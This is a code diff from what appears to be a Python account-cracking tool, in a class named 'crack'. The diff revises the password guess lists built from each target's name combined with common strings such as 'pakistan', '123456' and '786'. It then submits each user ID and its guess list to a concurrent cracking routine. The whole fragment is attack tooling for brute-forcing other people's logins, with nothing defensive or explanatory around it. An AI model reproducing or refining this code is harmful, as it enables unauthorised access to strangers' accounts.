@@ -168,7 +168,7 @@ class crack:
 					elif(len(str(name.lower()))<=3):
 						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','pakistan']
 					else:
-						pw=[name.lower()+'12345','pakistan','223344','000786','name.lower+'','name.lower()+'123','pakistan123','334455']
+						pw=[name.lower()+'12345','pakistan','223344','000786','pakistan123','334455','445566','123456','pakistan786',name.lower()+'123',name.lower()+'1234',name.lower()+'1122']
 					if(tip in ("02","2")):
 						kirim.submit(self.crack,uid,pw,name.lower())
 					elif(tip in ("01","1")):
@@ -188,7 +188,7 @@ class crack:
 					elif(len(str(name.lower()))<=3):
 						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','pakistan123']
 					else:
-					    pw=[name.lower()+'12345','pakistan','223344','000786','name.lower()+'','name.lower()+'123','pakistan123','334455']
+					    pw=[name.lower()+'12345','pakistan','223344','000786','pakistan123','334455','445566','123456','pakistan786',name.lower()+'123',name.lower()+'1234',name.lower()+'1122']
 					if(tip in ("02","2")):
 						kirim.submit(self.crack,uid,pw,name.lower())
 					elif(tip in ("01","1")):
